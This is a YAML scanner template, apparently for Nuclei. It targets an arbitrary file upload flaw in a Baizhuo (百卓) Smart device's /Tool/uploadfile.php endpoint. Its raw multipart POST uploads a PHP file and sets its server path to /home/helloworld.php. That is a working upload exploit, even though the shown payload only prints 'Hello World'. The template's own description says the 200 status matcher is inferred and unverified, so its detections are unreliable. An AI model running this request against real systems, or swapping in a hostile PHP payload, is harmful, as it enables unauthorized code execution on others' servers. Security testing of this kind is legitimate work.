id: poc-2128e620977bda91ed84
info:
  name: 百卓Smartuploadfile存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /Tool/uploadfile.php? HTTP/1.1

    Host: {{Hostname}}

    Cookie: PHPSESSID=942c6029711a902ca974ac33efcdb383

    Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887

    Content-Length: 409

    Upgrade-Insecure-Requests: 1

    Sec-Fetch-Dest: document

    Sec-Fetch-Mode: navigate

    Sec-Fetch-Site: same-origin

    Sec-Fetch-User: ?1

    Te: trailers

    Connection: close


    -----------------------------13979701222747646634037182887

    Content-Disposition: form-data; name="file_upload"; filename="contents.php"

    Content-Type: application/octet-stream


    <?php echo ''<p>Hello World</p>''; ?>

    -----------------------------13979701222747646634037182887

    Content-Disposition: form-data; name="txt_path"


    /home/helloworld.php

    -----------------------------13979701222747646634037182887--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
